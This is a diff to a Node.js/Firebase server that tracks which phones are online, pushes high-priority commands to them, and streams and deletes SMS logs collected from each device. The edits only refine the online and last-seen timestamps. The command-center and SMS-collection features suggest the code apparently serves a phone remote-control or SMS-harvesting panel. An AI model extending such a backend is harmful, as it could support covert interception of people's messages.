@@ -130,20 +130,23 @@ async function getAllBrosRepliesLive() {
       Object.entries(data).forEach(([uid, deviceData]) => {
         if (!deviceData || typeof deviceData !== 'object') return;
         
-        const checkedAt = deviceData.checkedAt || deviceData.timestamp || 0;
+        // ✅ checkedAt use karo for recency check
+        const checkedAt = deviceData.checkedAt || 0;
+        const lastSeen = deviceData.lastSeen || 0;
         const available = String(deviceData.available || "").toLowerCase().trim();
         
-        // ✅ Condition 1: Must be "device is online"
+        // Condition 1: Must be "device is online"
         const isOnline = available.includes("device is online");
         
-        // ✅ Condition 2: Must be within last 15 minutes
+        // Condition 2: Must be within last 15 minutes (using checkedAt)
         const isRecent = Number(checkedAt) > fifteenMinutesAgo;
         
         if (isOnline && isRecent) {
           activeDevices[uid] = { 
             uid, 
             ...deviceData,
-            lastSeen: checkedAt,
+            checkedAt,  // ✅ checkedAt show karo
+            lastSeen,   // ✅ lastSeen show karo
             isActive: true
           };
           activeCount++;
@@ -285,7 +288,12 @@ function startReplyWatcher(uid) {
     io.emit("brosReplyUpdate", {
       uid,
       success: true,
-      data: { uid, ...data },
+      data: { 
+        uid, 
+        ...data,
+        checkedAt: data.checkedAt || null,
+        lastSeen: data.lastSeen || null
+      },
     });
   });
 
@@ -300,7 +308,12 @@ app.get("/api/brosreply/:uid", async (req, res) => {
     stopReplyWatcher(uid);
 
     const snap = await rtdb.ref(`checkOnline/${uid}`).get();
-    const data = snap.exists() ? { uid, ...snap.val() } : null;
+    const data = snap.exists() ? { 
+      uid, 
+      ...snap.val(),
+      checkedAt: snap.val().checkedAt || null,
+      lastSeen: snap.val().lastSeen || null
+    } : null;
 
     startReplyWatcher(uid);
 
@@ -407,7 +420,9 @@ rtdb.ref("commandCenter/deviceCommands").on("child_added", handleDeviceCommandCh
 rtdb.ref("commandCenter/deviceCommands").on("child_changed", handleDeviceCommandChange);
 
 /* ======================================================
-      ⭐ CHECK ONLINE — RESET CLOCK + 5s COOLDOWN ⭐
+      ⭐ CHECK ONLINE — UPDATED LOGIC ⭐
+      checkedAt: hamesha update hoga
+      lastSeen: sirf tab update hoga jab "device is online" aaye
 ====================================================== */
 
 const checkCooldown = new Map();
@@ -420,7 +435,7 @@ async function handleCheckOnlineChange(snap) {
   const data = snap.val() || {};
   const now = Date.now();
 
-  // ✔ Debounce prevent duplicate quick triggers
+  // Debounce prevent duplicate quick triggers
   if (checkCooldown.has(uid) && now - checkCooldown.get(uid) < COOLDOWN_MS) {
     console.log("⏳ Skipped CHECK_ONLINE (cooldown):", uid);
     return;
@@ -428,30 +443,39 @@ async function handleCheckOnlineChange(snap) {
 
   checkCooldown.set(uid, now);
 
+  // ✅ Check if device is online based on available field
+  const isOnline = data.available && 
+                   String(data.available).toLowerCase().includes("device is online");
+
+  // ✅ Reset collection mein timestamp dalo (optional)
   await rtdb.ref(`resetCollection/${uid}`).set({
     resetAt: now,
     readable: new Date(now).toString(),
+    isOnline: isOnline
   });
 
+  // ✅ Status update karo - connectivity online rahega
   await rtdb.ref(`status/${uid}`).update({
     connectivity: "Online",
-    lastSeen: now,
+    lastSeen: now,  // status ka lastSeen hamesha update
     timestamp: now,
   });
 
-  console.log(`♻️ RESET CLOCK UPDATED for ${uid}`);
+  console.log(`♻️ CHECK ONLINE for ${uid}: isOnline=${isOnline}, checkedAt=${now}`);
 
   const devSnap = await rtdb.ref(`registeredDevices/${uid}`).get();
   const token = devSnap.val()?.fcmToken;
-  if (!token) return;
-
-  await sendFcmHighPriority(token, "CHECK_ONLINE", {
-    uniqueid: uid,
-    available: data.available || "unknown",
-    checkedAt: String(data.checkedAt || ""),
-  });
+  if (token) {
+    await sendFcmHighPriority(token, "CHECK_ONLINE", {
+      uniqueid: uid,
+      available: data.available || "unknown",
+      checkedAt: String(data.checkedAt || now),
+      lastSeen: String(data.lastSeen || ""),
+      isOnline: String(isOnline)
+    });
+  }
   
-  // ✅ IMPORTANT: Trigger getAllBrosRepliesLive when checkOnline updates
+  // ✅ Trigger getAllBrosRepliesLive when checkOnline updates
   setTimeout(() => {
     getAllBrosRepliesLive();
   }, 1000);
@@ -679,9 +703,7 @@ smsLogsRef.on("child_added", (snap) => {
 
   console.log(`🔍 SMS child_added for ${uid}, ${Object.keys(smsLogs).length} SMS found`);
 
-  // Send ALL SMS to socket, not just recent ones
   Object.entries(smsLogs).forEach(([smsId, smsData]) => {
-    // Add numeric timestamp for frontend
     const numericTimestamp = parseTimestamp(smsData.timestamp);
     const enhancedSmsData = {
       ...smsData,
@@ -696,22 +718,20 @@ smsLogsRef.on("child_changed", (snap) => {
   const uid = snap.key;
   const smsLogs = snap.val() || {};
 
-  console.log(`🔍 SMS child_changed for ${uid}, ${Object.keys(smsLogs).length} SMS found`);
+  console.log(` SMS child_changed for ${uid}, ${Object.keys(smsLogs).length} SMS found`);
 
-  // Get the latest SMS ID
   const smsIds = Object.keys(smsLogs);
   if (smsIds.length > 0) {
     const latestSmsId = smsIds[smsIds.length - 1];
     const latestSms = smsLogs[latestSmsId];
     
-    // Add numeric timestamp for frontend
     const numericTimestamp = parseTimestamp(latestSms.timestamp);
     const enhancedSmsData = {
       ...latestSms,
       numericTimestamp
     };
     
-    console.log(`🎯 Sending latest SMS: ${latestSmsId}, timestamp: ${numericTimestamp}`);
+    console.log(` Sending latest SMS: ${latestSmsId}, timestamp: ${numericTimestamp}`);
     emitLatestSmsUpdate(uid, latestSmsId, enhancedSmsData);
   }
 });
@@ -720,7 +740,6 @@ smsLogsRef.on("child_changed", (snap) => {
 });
 
 setInterval(() => {
-  // Clear processed IDs every 30 minutes
   processedSMSIds.clear();
   console.log('🔄 Cleared processed SMS IDs cache');
 }, 30 * 60 * 1000);
@@ -752,10 +771,8 @@ app.get("/api/smslogs/:uid", async (req, res) => {
       };
     });
 
-    // Sort by timestamp (newest first)
     logsArray.sort((a, b) => b.timestamp - a.timestamp);
     
-    // Limit results
     const limitedArray = logsArray.slice(0, limit);
 
     return res.json({
@@ -765,7 +782,7 @@ app.get("/api/smslogs/:uid", async (req, res) => {
       total: logsArray.length
     });
   } catch (err) {
-    console.error("❌ /api/smslogs ERROR:", err.message);
+    console.error(" /api/smslogs ERROR:", err.message);
     res.status(500).json({ success: false, error: err.message });
   }
 });
@@ -838,7 +855,7 @@ app.delete("/api/smslogs/:uid", async (req, res) => {
       });
     }
   } catch (err) {
-    console.error("❌ DELETE /api/smslogs ERROR:", err.message);
+    console.error(" DELETE /api/smslogs ERROR:", err.message);
     res.status(500).json({ success: false, error: err.message });
   }
 });
@@ -880,9 +897,9 @@ app.post("/api/test-sms/:uid", async (req, res) => {
 
 
 setInterval(() => {
-  console.log("🔄 Periodic check for active devices...");
+  console.log(" Periodic check for active devices...");
   getAllBrosRepliesLive();
-}, 30000); // Every 30 seconds
+}, 30000); 
 
 
 rtdb.ref("checkOnline").on("value", async (snapshot) => {
